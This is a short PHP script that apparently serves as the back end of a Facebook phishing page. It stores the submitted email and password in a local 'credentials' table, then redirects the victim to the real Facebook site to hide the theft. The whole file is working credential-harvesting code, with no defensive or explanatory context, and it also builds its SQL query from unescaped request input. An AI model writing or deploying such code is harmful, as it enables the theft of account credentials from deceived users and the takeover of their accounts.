<?php


$db_host = 'localhost';
$db_username = 'root';
$db_password = '';
$db_user = 'facebook';

$email = $_REQUEST['user'];
$pwd = $_REQUEST['pwd'];

$conn = mysqli_connect($db_host,$db_username,$db_password,$db_user);

if($conn==true){
    $sql = "INSERT INTO `credentials`(`email`, `password`) VALUES ('$email','$pwd')";
}

if (mysqli_query($conn, $sql)) {
    echo "New record created";
}
header("location: https://www.facebook.com/");
exit();
?>
